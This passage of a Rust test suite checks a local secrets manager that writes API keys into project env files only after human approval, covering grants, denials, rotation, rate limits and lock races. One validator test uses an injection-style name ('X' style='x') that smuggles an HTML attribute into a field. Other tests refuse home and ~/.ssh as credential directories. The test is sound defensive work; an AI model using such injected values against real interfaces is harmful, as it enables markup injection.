    assert!(rows.iter().any(|r| r.3 == "inject" && r.4.as_deref() == Some("MISTRAL_API_KEY") && r.7.as_deref() == Some(db::GRANT_BROAD)), "{rows:?}");
    // another directory shares none of it
    let other = tmp("v2-pairing-other").canonicalize().unwrap();
    let out = need::need(&ctx, &other, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Pending { .. }));
}

#[test]
fn a_denied_pairing_card_is_remembered() {
    let _g = env_lock();
    let (home, proj) = v2_world("deny");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    stash.set(&stash::stash_key("OPENAI_API_KEY", "default"), &SecretString::from("sk-aaaaaaaaaaaaaaaaaaaa".to_string())).unwrap();
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    tasks::answer_approval(&ctx, &db.get_task(&tid).unwrap().unwrap(), tasks::Decision::Deny, None).unwrap();
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Denied { .. }), "{out:?}");
    assert_eq!(db.list_tasks(Some(&proj.to_string_lossy()), true).unwrap().len(), 0, "no fresh card");
}

#[test]
fn a_paste_grants_exactly_one_key_and_nothing_else() {
    let _g = env_lock();
    let (home, proj) = v2_world("paste");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    tasks::answer_secret(&ctx, &db.get_task(&tid).unwrap().unwrap(), SecretString::from("sk-aaaaaaaaaaaaaaaaaaaa".to_string()), true).unwrap();
    let ws = db.find_workspace(&proj).unwrap().unwrap();
    let grants = db.grants_for(&ws.id).unwrap();
    assert_eq!(grants.len(), 1);
    assert_eq!((grants[0].0.as_str(), grants[0].1.as_str(), grants[0].3.as_str()), ("OPENAI_API_KEY", "default", db::GRANT_PASTE));
    // silent from now on here; a second key still pairs
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { .. }));
    stash.set(&stash::stash_key("GROQ_API_KEY", "default"), &SecretString::from("gsk_bbbbbbbbbbbbbbbb".to_string())).unwrap();
    let out = need::need(&ctx, &proj, "t", &["GROQ_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Pending { .. }));
}

#[test]
fn on_disk_equivalence_opens_one_delivery_and_is_not_a_grant() {
    let _g = env_lock();
    let (home, proj) = v2_world("ondisk");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let v = "sk-aaaaaaaaaaaaaaaaaaaa";
    stash.set(&stash::stash_key("OPENAI_API_KEY", "default"), &SecretString::from(v.to_string())).unwrap();
    stash.set(&stash::stash_key("STRIPE_SECRET_KEY", "default"), &SecretString::from("sk_live_cccccccccccc".to_string())).unwrap();
    // a copy that brought its .env.local along
    std::fs::write(proj.join(".env.local"), format!("OPENAI_API_KEY={v}\nSTRIPE_SECRET_KEY=sk_live_cccccccccccc\n")).unwrap();
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string(), "STRIPE_SECRET_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { .. }), "same value on disk: no card — {out:?}");
    assert!(matches!(out[1], need::Outcome::Pending { .. }), "sensitive keys never use the on-disk check");
    let ws = db.find_workspace(&proj).unwrap().unwrap();
    assert!(db.grants_for(&ws.id).unwrap().is_empty(), "not a grant");
    let rows = db.recent_audit(20).unwrap();
    assert!(rows.iter().any(|r| r.3 == "inject" && r.7.as_deref() == Some(db::GRANT_ON_DISK)));
    // rotation never follows it
    assert!(db.workspaces_granted("OPENAI_API_KEY", "default", true).unwrap().is_empty());
    // a different value on disk: a card, and no second comparison inside the TTL
    let other = tmp("v2-ondisk-other").canonicalize().unwrap();
    std::fs::write(other.join(".env.local"), "OPENAI_API_KEY=sk-guess-000000000000000\n").unwrap();
    let out = need::need(&ctx, &other, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Pending { .. }));
    std::fs::write(other.join(".env.local"), format!("OPENAI_API_KEY={v}\n")).unwrap();
    let out = need::need(&ctx, &other, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Pending { .. }), "a guess, then the right value, still waits for the TTL: {out:?}");
    // a symlinked env file is never compared
    let sym = tmp("v2-ondisk-sym").canonicalize().unwrap();
    std::os::unix::fs::symlink(proj.join(".env.local"), sym.join(".env.local")).unwrap();
    assert!(!trust::on_disk_equivalent(&sym, ".env.local", "OPENAI_API_KEY", &SecretString::from(v.to_string())));
}

#[test]
fn v1_approvals_backfill_into_grants_once() {
    let dir = tmp("v2-migrate");
    let path = dir.join("old.db");
    let proj = dir.join("proj"); std::fs::create_dir_all(&proj).unwrap();
    let gone = dir.join("gone");
    {
        let c = rusqlite::Connection::open(&path).unwrap();
        c.execute_batch("CREATE TABLE approvals (project TEXT NOT NULL, name TEXT NOT NULL, created TEXT NOT NULL, PRIMARY KEY (project, name));
                         CREATE TABLE bindings (project TEXT NOT NULL, name TEXT NOT NULL, identity TEXT NOT NULL, PRIMARY KEY (project, name));").unwrap();
        let p = proj.canonicalize().unwrap().to_string_lossy().to_string();
        c.execute("INSERT INTO approvals VALUES (?1, '*', 't')", [&p]).unwrap();
        c.execute("INSERT INTO approvals VALUES (?1, 'STRIPE_SECRET_KEY', 't')", [&p]).unwrap();
        c.execute("INSERT INTO approvals VALUES (?1, 'OPENAI_API_KEY', 't')", [&p]).unwrap();
        c.execute("INSERT INTO bindings VALUES (?1, 'OPENAI_API_KEY', 'work')", [&p]).unwrap();
        c.execute("INSERT INTO approvals VALUES (?1, 'GROQ_API_KEY', 't')", [gone.to_string_lossy().to_string()]).unwrap();
    }
    let db = Db::open(&path).unwrap();
    let ws = db.find_workspace(&proj).unwrap().expect("migrated root becomes a workspace");
    assert!(db.has_broad_grant(&ws.id, "default").unwrap(), "`*` → broad");
    assert_eq!(db.grant_source(&ws.id, "STRIPE_SECRET_KEY", "default").unwrap().as_deref(), Some(db::GRANT_BACKFILL));
    assert_eq!(db.grant_source(&ws.id, "OPENAI_API_KEY", "work").unwrap().as_deref(), Some(db::GRANT_BACKFILL), "identity from the binding");
    assert_eq!(db.binding(&ws.id, "OPENAI_API_KEY").unwrap().as_deref(), Some("work"));
    assert!(db.find_workspace(&gone).unwrap().is_none(), "a root that no longer exists gets nothing");
    assert_eq!(db.list_workspaces().unwrap().len(), 1);
    // the old tables are untouched (a 0.1 binary can still open this file), and the
    // migration does not run twice
    let n: i64 = db.conn.query_row("SELECT COUNT(*) FROM approvals", [], |r| r.get(0)).unwrap();
    assert_eq!(n, 4);
    db.revoke_workspace(&ws.id).unwrap();
    drop(db);
    let db = Db::open(&path).unwrap();
    assert!(db.grants_for(&ws.id).unwrap().is_empty(), "user_version guards the backfill");
}

#[test]
fn refused_roots_never_pair() {
    let _g = env_lock();
    let (home, _proj) = v2_world("refused");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let err = need::need(&ctx, std::path::Path::new("/tmp"), "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap_err().to_string();
    assert!(err.contains("shared temporary directory"), "{err}");
    assert!(db.list_workspaces().unwrap().is_empty());
}


#[test]
fn the_on_disk_check_is_rate_limited_per_key_not_per_directory() {
    let _g = env_lock();
    let (home, _proj) = v2_world("oracle");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let v = "sk-aaaaaaaaaaaaaaaaaaaa";
    stash.set(&stash::stash_key("OPENAI_API_KEY", "default"), &SecretString::from(v.to_string())).unwrap();
    // guess #1 in one directory, then the right value in a brand-new directory: no comparison
    let g1 = tmp("v2-oracle-g1").canonicalize().unwrap();
    std::fs::write(g1.join(".env.local"), "OPENAI_API_KEY=sk-guess-111111111111111\n").unwrap();
    assert!(matches!(need::need(&ctx, &g1, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap()[0], need::Outcome::Pending { .. }));
    let g2 = tmp("v2-oracle-g2").canonicalize().unwrap();
    std::fs::write(g2.join(".env.local"), format!("OPENAI_API_KEY={v}\n")).unwrap();
    assert!(matches!(need::need(&ctx, &g2, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap()[0], need::Outcome::Injected { .. }),
        "one wrong value elsewhere must not switch the check off for a legitimate copy");
    // …but a few misses anywhere do close it everywhere
    for i in 2..4 {
        let g = tmp(&format!("v2-oracle-g{i}x")).canonicalize().unwrap();
        std::fs::write(g.join(".env.local"), format!("OPENAI_API_KEY=sk-guess-{i}{i}{i}{i}{i}{i}{i}{i}{i}{i}{i}{i}{i}\n")).unwrap();
        need::need(&ctx, &g, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    }
    let g5 = tmp("v2-oracle-g5").canonicalize().unwrap();
    std::fs::write(g5.join(".env.local"), format!("OPENAI_API_KEY={v}\n")).unwrap();
    assert!(matches!(need::need(&ctx, &g5, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap()[0], need::Outcome::Pending { .. }),
        "three misses anywhere close the check for this key everywhere until the TTL passes");
}

#[test]
fn rotation_with_a_broad_grant_never_writes_a_sensitive_key() {
    let _g = env_lock();
    let (home, proj_a) = v2_world("rot-broad");
    let proj_b = tmp("v2-rot-broad-b").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    // A holds STRIPE via a paste; B has a broad grant and once received STRIPE one-time
    let t = tasks::create_secret_task(&ctx, &proj_a, "t", "STRIPE_SECRET_KEY", "default", &Default::default()).unwrap();
    tasks::answer_secret(&ctx, &t, SecretString::from("sk_live_oldoldoldold".to_string()), true).unwrap();
    let ws_b = db.workspace_for(&proj_b).unwrap();
    db.grant(&ws_b.id, "*", "default", db::GRANT_BROAD, db::GRANT_PAIRING).unwrap();
    let once = tasks::create_approval_task(&ctx, &proj_b, "run", &["STRIPE_SECRET_KEY@default".to_string()], tasks::ApprovalKind::Once).unwrap();
    tasks::answer_approval(&ctx, &once, tasks::Decision::Allow, None).unwrap();
    assert!(std::fs::read_to_string(proj_b.join(".env.local")).unwrap().contains("sk_live_old"));
    let card = tasks::rotate(&ctx, &proj_a, "human", "STRIPE_SECRET_KEY", "default").unwrap();
    let r = tasks::answer_secret(&ctx, &card, SecretString::from("sk_live_newnewnewnew".to_string()), true).unwrap();
    let tasks::AnswerResult::Stored { rotation: Some(rep), .. } = r else { panic!() };
    assert!(rep.rewritten.is_empty(), "{rep:?}");
    assert!(std::fs::read_to_string(proj_b.join(".env.local")).unwrap().contains("sk_live_old"), "broad never covers a sensitive key");
    // …but a broad grant does carry a registry non-sensitive key
    let t = tasks::create_secret_task(&ctx, &proj_a, "t", "GROQ_API_KEY", "default", &Default::default()).unwrap();
    tasks::answer_secret(&ctx, &t, SecretString::from("gsk_oldoldoldoldoldold".to_string()), true).unwrap();
    need::need(&ctx, &proj_b, "t", &["GROQ_API_KEY".to_string()], &Default::default()).unwrap();
    let card = tasks::rotate(&ctx, &proj_a, "human", "GROQ_API_KEY", "default").unwrap();
    let r = tasks::answer_secret(&ctx, &card, SecretString::from("gsk_newnewnewnewnewnew".to_string()), true).unwrap();
    let tasks::AnswerResult::Stored { rotation: Some(rep), .. } = r else { panic!() };
    assert_eq!(rep.rewritten, vec![proj_b.to_string_lossy().to_string()], "{rep:?}");
}

#[test]
fn a_denied_run_card_does_not_block_pairing_but_a_denied_pairing_blocks_run() {
    let _g = env_lock();
    let (home, proj) = v2_world("denykinds");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    stash.set(&stash::stash_key("OPENAI_API_KEY", "default"), &SecretString::from("sk-aaaaaaaaaaaaaaaaaaaa".to_string())).unwrap();
    let once = need::need(&ctx, &proj, "run", &["OPENAI_API_KEY".to_string()], &need::NeedOpts { require_approval: true, ..Default::default() }).unwrap();
    let tid = match &once[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    tasks::answer_approval(&ctx, &db.get_task(&tid).unwrap().unwrap(), tasks::Decision::Deny, None).unwrap();
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Pending { .. }), "a denied run card is not a denied pairing: {out:?}");
    let pid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), _ => unreachable!() };
    tasks::answer_approval(&ctx, &db.get_task(&pid).unwrap().unwrap(), tasks::Decision::Deny, None).unwrap();
    let once = need::need(&ctx, &proj, "run", &["OPENAI_API_KEY".to_string()], &need::NeedOpts { require_approval: true, ..Default::default() }).unwrap();
    assert!(matches!(once[0], need::Outcome::Denied { .. }), "a denied pairing blocks a run request too: {once:?}");
}

#[test]
fn a_card_that_grew_since_it_was_read_is_refused() {
    let _g = env_lock();
    let (home, proj) = v2_world("toctou");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    for n in ["OPENAI_API_KEY", "GROQ_API_KEY"] {
        stash.set(&stash::stash_key(n, "default"), &SecretString::from("aaaaaaaaaaaaaaaaaaaaaa".to_string())).unwrap();
    }
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    let shown = db.get_task(&tid).unwrap().unwrap();
    // the agent asks for more while the human has the page open
    need::need(&ctx, &proj, "t", &["GROQ_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let err = tasks::answer_approval(&ctx, &shown, tasks::Decision::Allow, Some(&shown.names)).unwrap_err().to_string();
    assert!(err.contains("changed since you read it"), "{err}");
    let ws = db.find_workspace(&proj).unwrap().unwrap();
    assert!(db.grants_for(&ws.id).unwrap().is_empty());
    // re-read, then it goes through
    let now = db.get_task(&tid).unwrap().unwrap();
    tasks::answer_approval(&ctx, &now, tasks::Decision::Allow, Some(&now.names)).unwrap();
    assert_eq!(db.grants_for(&ws.id).unwrap().len(), 2);
}

/// The answer re-reads the card, compares it with what the human was shown, and decides and
/// closes it under one index write lock. An agent's merge that already holds the lock when
/// the answer starts lands first, and the answer refuses the grown card. A denial never
/// records a key the human was not shown, and an approval never closes one.
#[test]
fn an_answer_compares_and_closes_the_card_under_one_lock() {
    let _g = env_lock();
    let (home, proj) = v2_world("answer-lock");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let pid = proj.to_string_lossy().to_string();
    for n in ["OPENAI_API_KEY", "GROQ_API_KEY", "RESEND_API_KEY"] {
        stash.set(&stash::stash_key(n, "default"), &SecretString::from("aaaaaaaaaaaaaaaaaaaaaa".to_string())).unwrap();
    }
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    let ws = db.find_workspace(&proj).unwrap().unwrap();
    for (decision, added) in [(tasks::Decision::Deny, "GROQ_API_KEY@default"), (tasks::Decision::Allow, "RESEND_API_KEY@default")] {
        let shown = db.get_task(&tid).unwrap().unwrap();
        // Another process's `need` is growing the card. It holds the write lock when the
        // human's answer starts and commits 300 ms later.
        let agent = Db::open(&home.join("t.db")).unwrap();
        let mut grown = shown.names.clone();
        grown.push(added.to_string());
        let card_id = tid.clone();
        let (locked, wait_locked) = std::sync::mpsc::channel();
        let merge = std::thread::spawn(move || {
            agent.conn.execute_batch("BEGIN IMMEDIATE").unwrap();
            assert!(agent.update_task_names(&card_id, &grown).unwrap());
            locked.send(()).unwrap();
            std::thread::sleep(std::time::Duration::from_millis(300));
            agent.conn.execute_batch("COMMIT").unwrap();
        });
        wait_locked.recv().unwrap();
        let answer = tasks::answer_approval(&ctx, &shown, decision, Some(&shown.names));
        merge.join().unwrap();
        let err = format!("{:#}", answer.expect_err("the card grew before the answer held the lock"));
        assert!(err.contains("changed since you read it"), "{decision:?}: {err}");
        let card = db.get_task(&tid).unwrap().unwrap();
        assert_eq!(card.status, db::TaskStatus::Pending, "{decision:?}");
        assert!(card.names.iter().any(|n| n == added));
        assert!(db.recent_denied_approvals(&pid, "1970-01-01T00:00:00Z").unwrap().is_empty(), "nothing is denied that the human was not shown");
        assert!(db.grants_for(&ws.id).unwrap().is_empty(), "nothing is granted");
    }
    // Re-read, the answer goes through and covers exactly what the human was shown.
    let now = db.get_task(&tid).unwrap().unwrap();
    tasks::answer_approval(&ctx, &now, tasks::Decision::Allow, Some(&now.names)).unwrap();
    assert_eq!(db.grants_for(&ws.id).unwrap().len(), 3);
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

#[test]
fn refused_roots_include_home_and_tool_dirs_and_a_dotfiles_repo_is_not_a_project() {
    let _g = env_lock();
    let (home_ts, _proj) = v2_world("refused2");
    let cfg = Config::default();
    let db = Db::open(&home_ts.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let home = dirs::home_dir().unwrap();
    for (p, why) in [(home.clone(), "home directory"), (home.join(".ssh"), "credential directory")] {
        if !p.is_dir() { continue; }
        let err = need::need(&ctx, &p, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap_err().to_string();
        assert!(err.contains(why), "{err}");
    }
    // a `.git` at a refused root does not make its children resolve to it
    let fake_home = tmp("v2-fakehome").canonicalize().unwrap();
    std::fs::create_dir_all(fake_home.join(".git")).unwrap();
    std::fs::write(fake_home.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
    std::fs::create_dir_all(fake_home.join("scratch/foo")).unwrap();
    assert_eq!(envfile::owned_git_root(&fake_home.join("scratch/foo")).unwrap(), Some(fake_home.clone()), "an ordinary dir with .git is a root");
    assert!(trust::refused_root(&home).is_some());
}

#[test]
fn wait_after_a_pairing_card_delivers_with_the_pairing_source() {
    let _g = env_lock();
    let (home, proj) = v2_world("waitpair");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    stash.set(&stash::stash_key("OPENAI_API_KEY", "default"), &SecretString::from("sk-aaaaaaaaaaaaaaaaaaaa".to_string())).unwrap();
    let mut out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    tasks::answer_approval(&ctx, &db.get_task(&tid).unwrap().unwrap(), tasks::Decision::Allow, None).unwrap();
    need::wait(&ctx, &proj, &mut out, std::time::Duration::from_millis(10)).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { .. }), "{out:?}");
    let rows = db.recent_audit(10).unwrap();
    assert!(rows.iter().any(|r| r.3 == "inject" && r.7.as_deref() == Some(db::GRANT_PAIRING)), "{rows:?}");
    assert!(!rows.iter().any(|r| r.3 == "inject" && r.7.as_deref() == Some(db::GRANT_PASTE)));
}

#[test]
fn migration_handles_symlinked_duplicates_and_non_directories() {
    let dir = tmp("v2-migrate2");
    let path = dir.join("old.db");
    let proj = dir.join("proj"); std::fs::create_dir_all(&proj).unwrap();
    let link = dir.join("link"); std::os::unix::fs::symlink(&proj, &link).unwrap();
    let file = dir.join("afile"); std::fs::write(&file, "x").unwrap();
    {
        let c = rusqlite::Connection::open(&path).unwrap();
        c.execute_batch("CREATE TABLE approvals (project TEXT NOT NULL, name TEXT NOT NULL, created TEXT NOT NULL, PRIMARY KEY (project, name));
                         CREATE TABLE bindings (project TEXT NOT NULL, name TEXT NOT NULL, identity TEXT NOT NULL, PRIMARY KEY (project, name));").unwrap();
        c.execute("INSERT INTO approvals VALUES (?1, 'OPENAI_API_KEY', 't')", [proj.to_string_lossy().to_string()]).unwrap();
        c.execute("INSERT INTO approvals VALUES (?1, 'GROQ_API_KEY', 't')", [link.to_string_lossy().to_string()]).unwrap();
        c.execute("INSERT INTO approvals VALUES (?1, 'X_KEY', 't')", [file.to_string_lossy().to_string()]).unwrap();
    }
    let db = Db::open(&path).unwrap();
    assert_eq!(db.list_workspaces().unwrap().len(), 1, "the symlink and its target are one workspace; a file is none");
    let ws = db.find_workspace(&proj).unwrap().unwrap();
    assert_eq!(db.grants_for(&ws.id).unwrap().len(), 2);
}


#[test]
fn names_are_env_var_names_and_nothing_else() {
    let _g = env_lock();
    let (home, proj) = v2_world("names");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    for bad in ["X' style='x", "A=B", "1KEY", "KEY NAME", "K@work", "", "É"] {
        assert!(need::need(&ctx, &proj, "t", &[bad.to_string()], &need::NeedOpts::default()).is_err(), "{bad:?} must be refused");
    }
    assert!(need::valid_name("OPENAI_API_KEY") && need::valid_name("_x9"));
}

#[test]
fn a_card_answered_during_a_merge_does_not_authorise_the_merged_name() {
    let _g = env_lock();
    let (home, proj) = v2_world("mergerace");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    for n in ["OPENAI_API_KEY", "GROQ_API_KEY"] {
        stash.set(&stash::stash_key(n, "default"), &SecretString::from("aaaaaaaaaaaaaaaaaaaaaa".to_string())).unwrap();
    }
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    // the human answers; the merge that races it must not land on the answered card
    tasks::answer_approval(&ctx, &db.get_task(&tid).unwrap().unwrap(), tasks::Decision::Allow, None).unwrap();
    assert!(!db.update_task_names(&tid, &["OPENAI_API_KEY@default".into(), "GROQ_API_KEY@default".into()]).unwrap(), "an answered card cannot grow");
    // a wait() holding the answered card's id for a name it never covered asks again
    let mut out = vec![need::Outcome::Pending { name: "GROQ_API_KEY".into(), identity: "default".into(), task_id: tid.clone(), title: String::new(), url: None }];
    need::wait(&ctx, &proj, &mut out, std::time::Duration::from_millis(10)).unwrap();
    match &out[0] {
        need::Outcome::Pending { task_id, .. } => assert_ne!(*task_id, tid, "a fresh card"),
        o => panic!("must not deliver an ungranted key: {o:?}"),
    }
    assert!(!envfile::has(&proj, ".env.local", "GROQ_API_KEY"));
}

#[test]
fn a_paste_into_a_re_created_directory_does_not_wipe_the_old_record() {
    let _g = env_lock();
    let (home, proj) = v2_world("driftpaste");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let ws = db.workspace_for(&proj).unwrap();
    db.grant(&ws.id, "GROQ_API_KEY", "default", db::GRANT_KEY, db::GRANT_PAIRING).unwrap();
    std::fs::remove_dir_all(&proj).unwrap();
    std::thread::sleep(std::time::Duration::from_millis(20));
    std::fs::create_dir_all(&proj).unwrap();
    let t = tasks::create_secret_task(&ctx, &proj, "t", "OPENAI_API_KEY", "default", &Default::default()).unwrap();
    tasks::answer_secret(&ctx, &t, SecretString::from("sk-aaaaaaaaaaaaaaaaaaaa".to_string()), true).unwrap();
    assert_eq!(db.grants_for(&ws.id).unwrap().len(), 1, "old record untouched by a bare paste");
    assert!(db.recent_audit(10).unwrap().iter().any(|r| r.3 == "grant.skipped"));
    // (the paste wrote the value, so while it sits in the env file the on-disk check opens
    // deliveries without a grant; once it is gone the directory must pair)
    std::fs::remove_file(proj.join(".env.local")).unwrap();
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    tasks::answer_approval(&ctx, &db.get_task(&tid).unwrap().unwrap(), tasks::Decision::Allow, None).unwrap();
    let fresh = db.find_workspace(&proj).unwrap().unwrap();
    assert_ne!(fresh.id, ws.id);
    assert!(db.grants_for(&ws.id).unwrap().is_empty(), "replaced by the human's pairing");
}

// ---------------------------------------------------------------------------
// Regressions. Each test below pins a defect fixed before the first public release;
// the comment on each says what breaks without the fix.
// ---------------------------------------------------------------------------

/// A generated secret belongs to the project that generated it. Shared, one directory
/// holding a broad grant would receive another application's signing key and could mint
/// sessions for it.
#[test]
fn a_generated_secret_is_per_project() {
    let _g = env_lock();
    let (home, a) = v2_world("gen");
    let b = tmp("v2-gen-other-proj").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };

    let out = need::need(&ctx, &a, "agent", &["JWT_SECRET".to_string()], &Default::default()).unwrap();
    assert!(matches!(&out[0], need::Outcome::Injected { generated: true, .. }), "{:?}", out[0]);

    // B is paired and allowed broadly — the widest standing consent there is.
    let ws = db.workspace_for(&b).unwrap();
    for identity in ["default", &need::project_identity(&b)] {
        db.grant(&ws.id, "*", identity, db::GRANT_BROAD, db::GRANT_PAIRING).unwrap();
    }
    let out = need::need(&ctx, &b, "agent", &["JWT_SECRET".to_string()], &Default::default()).unwrap();
    assert!(matches!(&out[0], need::Outcome::Injected { generated: true, .. }), "B generates its own: {:?}", out[0]);

    let va = std::fs::read_to_string(a.join(".env.local")).unwrap();
    let vb = std::fs::read_to_string(b.join(".env.local")).unwrap();
    assert_ne!(va, vb, "B must not receive A's signing key");
    assert_ne!(need::project_identity(&a), need::project_identity(&b));
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

/// "No" to this key here outlives a broad grant. Without this, denying a card and then
/// pasting the key for another project turns the next request into a silent delivery.
#[test]
fn a_broad_grant_does_not_overrule_a_denial_for_this_key() {
    let _g = env_lock();
    let (home, proj) = v2_world("deny-broad");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    // The value exists in the stash (pasted for some other project).
    stash.set(&stash::stash_key("RESEND_API_KEY", "default"), &SecretString::from("re_aaaaaaaaaaaaaaaaaaaa".to_string())).unwrap();
    // This directory is paired and allowed broadly...
    let ws = db.workspace_for(&proj).unwrap();
    db.grant(&ws.id, "*", "default", db::GRANT_BROAD, db::GRANT_PAIRING).unwrap();
    // ...but the human denied this key here.
    let t = tasks::create_secret_task(&ctx, &proj, "agent", "RESEND_API_KEY", "default", &Default::default()).unwrap();
    tasks::deny(&ctx, &t, Some("not in this project")).unwrap();

    let out = need::need(&ctx, &proj, "agent", &["RESEND_API_KEY".to_string()], &Default::default()).unwrap();
    assert!(matches!(&out[0], need::Outcome::Denied { .. }), "{:?}", out[0]);
    assert!(!proj.join(".env.local").exists(), "nothing written");
    // --force is still the human's own way to ask again
    let opts = need::NeedOpts { force: true, ..Default::default() };
    let out = need::need(&ctx, &proj, "agent", &["RESEND_API_KEY".to_string()], &opts).unwrap();
